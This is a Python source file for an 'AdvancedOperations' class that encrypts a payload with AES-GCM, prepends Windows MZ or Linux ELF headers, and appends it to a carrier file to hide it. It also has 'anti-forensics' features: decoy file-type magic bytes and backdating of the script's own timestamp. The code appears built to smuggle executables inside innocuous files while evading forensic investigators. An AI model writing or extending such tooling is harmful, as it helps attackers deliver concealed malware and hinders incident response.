# core/advanced_operations.py
import os
import random
import tempfile
from datetime import datetime
from Crypto.Cipher import AES

class AdvancedOperations:
    """Handles advanced payload operations with anti-forensics"""
    
    def __init__(self, security_manager):
        self.security = security_manager
        self.anti_forensics_enabled = False
        self.decoy_headers = [
            b"\xFF\xD8\xFF\xE0",  # JPEG
            b"\x89PNG\r\n\x1a\n",  # PNG
            b"MZ\x90\x00"         # EXE
        ]

    def enable_anti_forensics(self):
        """Enable anti-forensic countermeasures"""
        self.anti_forensics_enabled = True
        self._randomize_metadata()
        
    def _randomize_metadata(self):
        """Randomize timestamps and identifiers"""
        now = datetime.now().timestamp()
        random_time = now - random.randint(0, 31536000)
        os.utime(__file__, (random_time, random_time))

    def stealth_embed(self, payload_path, carrier_path, output_type, platform=None):
        """Core embedding logic with platform-specific features"""
        try:
            # Add platform-specific header
            if platform == "Windows":
                platform_header = b"\x4D\x5A"  # MZ header
            elif platform == "Linux":
                platform_header = b"\x7F\x45\x4C\x46"  # ELF header
            else:
                platform_header = b""

            # Read and process files
            with open(payload_path, "rb") as f:
                payload = platform_header + f.read()
                
            with open(carrier_path, "rb") as f:
                carrier = f.read()

            # Encrypt payload
            cipher = AES.new(self.security.encryption_key, AES.MODE_GCM)
            cipher.update(b"FileHeader")
            ciphertext, tag = cipher.encrypt_and_digest(payload)

            # Add anti-forensics if enabled
            if self.anti_forensics_enabled:
                carrier += random.choice(self.decoy_headers)

            # Combine and save
            combined = carrier + cipher.nonce + tag + ciphertext
            
            fd, temp_path = tempfile.mkstemp()
            with os.fdopen(fd, "wb") as f:
                f.write(combined)
                
            return temp_path
            
        except Exception as e:
            raise RuntimeError(f"Embedding failed: {str(e)}")